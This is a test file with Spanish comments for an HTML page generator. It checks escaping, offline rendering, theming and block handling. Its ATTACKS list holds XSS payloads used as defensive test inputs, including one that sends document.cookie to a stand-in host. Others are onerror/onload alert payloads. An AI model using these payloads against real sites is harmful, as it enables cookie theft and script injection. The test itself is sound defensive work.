import { test } from "node:test";
import assert from "node:assert/strict";
import { buildPage, esc, THEMES } from "./build.js";

/**
 * El test que justifica el producto. Un generador de HTML que no escapa no es un
 * producto, es un XSS vendido a $0.02 — y el que lo compra no se entera hasta
 * que alguien abre la página.
 */

const ATTACKS = [
  '</script><script>fetch("https://evil.tld?c="+document.cookie)</script>',
  '"><img src=x onerror=alert(1)>',
  "'><svg/onload=alert(1)>",
  "</title></head><body onload=alert(1)>",
  "</style><script>alert(1)</script>",
  "javascript:alert(1)",
  "&lt;already escaped&gt;",
];

test("esc neutraliza las cinco entidades, incluidas las comillas", () => {
  assert.equal(esc(`<a href="x" id='y'>&</a>`), "&lt;a href=&quot;x&quot; id=&#39;y&#39;&gt;&amp;&lt;/a&gt;");
  assert.equal(esc(undefined), "");
  assert.equal(esc(null), "");
  assert.equal(esc(42), "42");
});

/** El esqueleto de tags que genera la plantilla, ignorando el contenido. */
function skeleton(html: string): string[] {
  return html.match(/<\/?[a-zA-Z][^>]*>/g) ?? [];
}

test("la entrada del llamador no puede alterar la estructura del documento", () => {
  // Esta es la propiedad de seguridad real, y es más fuerte que buscar strings
  // peligrosos: se arma la misma página con un texto inofensivo y con cada
  // payload, y el esqueleto de tags tiene que ser IDÉNTICO. Si un payload
  // lograra abrir, cerrar o modificar un solo tag, los esqueletos difieren.
  //
  // Buscar "onerror=" en el HTML no sirve: aparece escapado como texto inerte
  // dentro de &lt;img ...&gt; y daría un falso positivo. Lo que importa no es si
  // la secuencia está, es si el navegador la ve como marcado.
  const spec = (v: string) => ({
    title: v,
    subtitle: v,
    blocks: [
      { type: "heading" as const, text: v },
      { type: "text" as const, text: v },
      { type: "list" as const, items: [v] },
      { type: "table" as const, columns: [v], rows: [[v]] },
      { type: "stat" as const, label: v, value: v, note: v },
      { type: "code" as const, text: v, language: v },
    ],
  });

  const benign = skeleton(buildPage(spec("inofensivo")));

  for (const attack of ATTACKS) {
    const html = buildPage(spec(attack));
    assert.deepEqual(
      skeleton(html),
      benign,
      `el payload alteró la estructura del documento: ${attack}`,
    );

    // Y un payload con metacaracteres nunca aparece crudo.
    if (/[<>"\']/.test(attack)) {
      assert.ok(!html.includes(attack), `el payload sobrevivió sin escapar: ${attack}`);
    }
  }
});

test("el lang inválido cae a 'en' en vez de inyectarse en el atributo", () => {
  const html = buildPage({ title: "t", lang: '"><script>x</script>', blocks: [{ type: "text", text: "a" }] });
  assert.match(html, /<html lang="en">/);
});

test("produce un documento completo y sin un solo request externo", () => {
  const html = buildPage({
    title: "Informe",
    subtitle: "sub",
    blocks: [{ type: "heading", text: "h" }, { type: "divider" }, { type: "text", text: "p" }],
  });
  assert.match(html, /^<!doctype html>/);
  assert.match(html, /<\/html>\s*$/);
  assert.match(html, /<meta name="viewport"/);
  assert.match(html, /<title>Informe<\/title>/);

  // Ni CDN, ni fuentes remotas, ni imágenes externas: renderiza offline.
  assert.equal((html.match(/https?:\/\//g) ?? []).length, 0, "la página trae una URL externa");
  assert.equal((html.match(/<link/gi) ?? []).length, 0, "la página trae un <link>");
});

test("cada tema define claro y oscuro, y la página los declara", () => {
  for (const name of Object.keys(THEMES)) {
    const html = buildPage({ title: "t", theme: name, blocks: [{ type: "text", text: "a" }] });
    assert.match(html, /prefers-color-scheme:dark/, `${name}: sin bloque oscuro`);
    assert.match(html, /--bg:/, `${name}: sin token de fondo`);
    assert.match(html, /color-scheme:light/, `${name}: sin color-scheme`);
    assert.equal(THEMES[name].light.length, 6);
    assert.equal(THEMES[name].dark.length, 6);
  }
});

test("una tabla ancha scrollea en su propio contenedor, no en la página", () => {
  const html = buildPage({
    title: "t",
    blocks: [{ type: "table", columns: ["a", "b", "c"], rows: [["1", "2", "3"]] }],
  });
  assert.match(html, /<div class="tw"><table>/);
  assert.match(html, /\.tw\{overflow-x:auto/);
});

test("un bloque desconocido se rechaza con su índice, no se descarta en silencio", () => {
  assert.throws(
    () =>
      buildPage({
        title: "t",
        blocks: [{ type: "text", text: "ok" }, { type: "carousel" } as never],
      }),
    /Unknown block type "carousel" at index 1/,
  );
});

test("un bloque incompleto no rompe: renderiza vacío", () => {
  const html = buildPage({
    title: "t",
    blocks: [{ type: "text" }, { type: "list" }, { type: "table" }, { type: "stat" }, { type: "code" }],
  });
  assert.match(html, /<p><\/p>/);
  assert.match(html, /<ul><\/ul>/);
});

test("un heading solo puede ser h2 o h3, nunca h1 duplicado ni h7", () => {
  const h = (level: number) => buildPage({ title: "t", blocks: [{ type: "heading", text: "x", level }] });
  assert.match(h(3), /<h3>x<\/h3>/);
  assert.match(h(2), /<h2>x<\/h2>/);
  assert.match(h(1), /<h2>x<\/h2>/, "level 1 debe caer a h2: el h1 es el título");
  assert.match(h(9), /<h2>x<\/h2>/);
  assert.equal((h(1).match(/<h1/g) ?? []).length, 1, "debe haber exactamente un h1 en la página");
});
